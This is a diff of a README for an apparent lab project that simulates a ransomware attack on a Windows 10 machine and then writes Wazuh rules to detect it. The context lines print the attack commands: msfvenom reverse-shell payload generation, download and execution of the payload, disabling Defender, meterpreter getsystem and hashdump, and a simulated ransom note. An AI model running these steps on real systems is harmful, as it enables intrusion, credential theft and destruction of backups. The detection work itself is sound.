@@ -24,7 +24,8 @@
 - [Detection Engineering & Rule Optimization](#-detection-engineering--rule-optimization)
 - [MITRE ATT&CK Mapping](#-mitre-attck-mapping)
 - [Indicators of Compromise (IOCs)](#-indicators-of-compromise-iocs)
-- [Incident Report](#-incident-report)
+- [Incident Report (PDF & Markdown)](#-incident-report-pdf--markdown)
+- [Repository Structure](#-repository-structure)
 - [Author](#-author)
 
 ---
@@ -101,13 +102,13 @@ sc query sysmon64
 Get-Service -Name "wazuh", "sysmon64" | Select-Object Name, Status
 ```
 
-![Sysmon Service Running](Wazuh/02-sysmon-service-running.png)
+![Sysmon Service Running](assets/screenshots/02-sysmon-service-running.png)
 *Figure 1: Windows Command Prompt confirming `sysmon64` service in RUNNING state.*
 
-![Wazuh Agent Active](Wazuh/01-wazuh-agent-active.png)
+![Wazuh Agent Active](assets/screenshots/01-wazuh-agent-active.png)
 *Figure 2: Wazuh Dashboard confirming Agent01 (`192.168.184.166`) actively connected.*
 
-![Sysmon Log Ingestion](Wazuh/03-wazuh-sysmon-events.png)
+![Sysmon Log Ingestion](assets/screenshots/03-wazuh-sysmon-events.png)
 *Figure 3: Wazuh Discover validating real-time telemetry from `Microsoft-Windows-Sysmon/Operational`.*
 
 ---
@@ -118,14 +119,14 @@ Get-Service -Name "wazuh", "sysmon64" | Select-Object Name, Status
    ```bash
    nmap -sV -O -p- 192.168.184.166 -oN nmap_scan.txt
    ```
-   ![Nmap Scan Results](Wazuh/04-nmap-scan-results.png)
+   ![Nmap Scan Results](assets/screenshots/04-nmap-scan-results.png)
    *Figure 4: Nmap scan identifying open RPC (135/tcp), NetBIOS (139/tcp), SMB (445/tcp), and HTTP (5357/tcp).*
 
 2. **Programmatic Defense Disabling (Windows 10):**
    ```powershell
    Set-MpPreference -DisableRealtimeMonitoring $true
    ```
-   ![Defender Disabled](Wazuh/05-defender-disabled.png)
+   ![Defender Disabled](assets/screenshots/05-defender-disabled.png)
    *Figure 5: Disabling Windows Defender Real-Time Monitoring via administrative PowerShell prompt.*
 
 ---
@@ -137,7 +138,7 @@ Get-Service -Name "wazuh", "sysmon64" | Select-Object Name, Status
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.184.129 LPORT=4444 -f exe -o payload.exe
    python3 -m http.server 8080
    ```
-   ![Payload Generated](Wazuh/06-payload-generated.png)
+   ![Payload Generated](assets/screenshots/06-payload-generated.png)
    *Figure 6: Msfvenom binary generation (7680 bytes) and local Python web server startup.*
 
 2. **Endpoint Payload Download (Windows 10):**
@@ -145,7 +146,7 @@ Get-Service -Name "wazuh", "sysmon64" | Select-Object Name, Status
    Invoke-WebRequest -Uri "http://192.168.184.129:8080/payload.exe" -OutFile "C:\Users\Public\payload.exe"
    Get-ChildItem C:\Users\Public\payload.exe
    ```
-   ![Payload Downloaded](Wazuh/07-payload-downloaded-windows.png)
+   ![Payload Downloaded](assets/screenshots/07-payload-downloaded-windows.png)
    *Figure 7: Downloading `payload.exe` to `C:\Users\Public\` via native PowerShell web request.*
 
 ---
@@ -160,14 +161,14 @@ Get-Service -Name "wazuh", "sysmon64" | Select-Object Name, Status
    set LPORT 4444
    run
    ```
-   ![Metasploit Listener Running](Wazuh/08-metasploit-listener-running.png)
+   ![Metasploit Listener Running](assets/screenshots/08-metasploit-listener-running.png)
    *Figure 8: Metasploit multi/handler listening on interface `192.168.184.129:4444`.*
 
 2. **Payload Execution & Reverse Socket Establishment:**
    ```cmd
    C:\Users\Public\payload.exe
    ```
-   ![Meterpreter Session Open](Wazuh/09-meterpreter-session-open.png)
+   ![Meterpreter Session Open](assets/screenshots/09-meterpreter-session-open.png)
    *Figure 9: Meterpreter session 1 established from `192.168.184.166:60820` at 04:47:59.*
 
 ---
@@ -186,7 +187,7 @@ getsystem
 hashdump
 ```
 
-![getuid, sysinfo, getsystem, and hashdump](Wazuh/10-getuid-sysinfo.png)
+![getuid, sysinfo, getsystem, and hashdump](assets/screenshots/10-getuid-sysinfo.png)
 *Figure 10: Successful in-memory privilege escalation to `NT AUTHORITY\SYSTEM` and SAM database NTLM hash dump.*
 
 ---
@@ -208,10 +209,10 @@ echo "YOUR NETWORK IS ENCRYPTED. CONTACT RECOVERY@PROTON.ME" > C:\Users\Public\D
 echo "LOCKED" > C:\Users\Public\Desktop\FINANCIAL_2026.xlsx.enc
 ```
 
-![Shadow Copies Deleted](Wazuh/13-vssadmin-shadows-deleted.png)
+![Shadow Copies Deleted](assets/screenshots/13-vssadmin-shadows-deleted.png)
 *Figure 11: Executing destructive recovery inhibition commands (`vssadmin` and `wbadmin`) from elevated command prompt.*
 
-![Ransomware Payload Simulated](Wazuh/14-ransomware-payload-simulated.png)
+![Ransomware Payload Simulated](assets/screenshots/14-ransomware-payload-simulated.png)
 *Figure 12: Simulated ransom note (`README_DECRYPT.txt`) and encrypted file (`FINANCIAL_2026.xlsx.enc`) created on victim desktop.*
 
 ---
@@ -223,7 +224,7 @@ During the initial log evaluation phase, a **critical monitoring gap** was demon
 - Executing `data.win.eventdata.commandLine: *vssadmin*` in Wazuh Discover against default `wazuh-alerts-*` indices returned **No Results**.
 - **Root Cause:** By default, Wazuh manager drops raw log events with severity below Level 3. Out-of-the-box rule sets categorize native administrative utilities (e.g. `vssadmin.exe`, `wbadmin.exe`) as routine operational activity, failing to elevate shadow copy destruction to an alertable security event.
 
-![Default Alert Gap](Wazuh/15-default-alert-low-severity.png)
+![Default Alert Gap](assets/screenshots/15-default-alert-low-severity.png)
 *Figure 13: Detection Gap evidence — Wazuh Discover returning "No Results" for critical `vssadmin` execution.*
 
 ---
@@ -280,17 +281,17 @@ To eliminate this blind spot, three custom detection rules were authored in `/va
    ```bash
    /var/ossec/bin/wazuh-logtest
    ```
-   ![Custom Rules XML](Wazuh/16-custom-rules-xml.png)
+   ![Custom Rules XML](assets/screenshots/16-custom-rules-xml.png)
    *Figure 14: Validating custom XML rule syntax using Wazuh CLI logtest utility.*
 
 2. **SIEM Alert Escalation Verification:**
    ```bash
    sudo systemctl restart wazuh-manager
    ```
-   ![Level 12 Alert Fired](Wazuh/17-level12-critical-alert.png)
+   ![Level 12 Alert Fired](assets/screenshots/17-level12-critical-alert.png)
    *Figure 15: Wazuh Discover displaying 2 hits firing at Level 12 Critical following attack re-execution.*
 
-   ![Alert Detail MITRE Mapping](Wazuh/18-alert-detail-mitre-mapping.png)
+   ![Alert Detail MITRE Mapping](assets/screenshots/18-alert-detail-mitre-mapping.png)
    *Figure 16: Expanded alert detail confirming Rule ID 100001 firing at Level 12 with MITRE T1490 tag.*
 
 ---
@@ -326,9 +327,31 @@ To eliminate this blind spot, three custom detection rules were authored in `/va
 
 ---
 
-## 📄 Incident Report
+## 📄 Incident Report (PDF & Markdown)
 
-Full incident documentation is available in [docs/INCIDENT_REPORT.md](docs/INCIDENT_REPORT.md).
+Official Incident Documentation is available in multiple formats:
+- **PDF Report:** 📄 [INCIDENT_REPORT.pdf](docs/INCIDENT_REPORT.pdf) *(Executive Printable Document)*
+- **Markdown Version:** 📝 [INCIDENT_REPORT.md](docs/INCIDENT_REPORT.md)
+
+---
+
+## 📂 Repository Structure
+
+```text
+.
+├── README.md                           # Main Project Technical Documentation
+├── rules/
+│   └── local_rules.xml                 # Production Custom Wazuh XML Rules (100001 - 100003)
+├── docs/
+│   ├── INCIDENT_REPORT.pdf             # Executive Incident Report Document (PDF Format)
+│   └── INCIDENT_REPORT.md              # Incident Report (Markdown Format)
+└── assets/
+    └── screenshots/                    # Evidence Screenshots (01 to 18)
+        ├── 01-wazuh-agent-active.png
+        ├── 02-sysmon-service-running.png
+        ├── ...
+        └── 18-alert-detail-mitre-mapping.png
+```
 
 ---
 
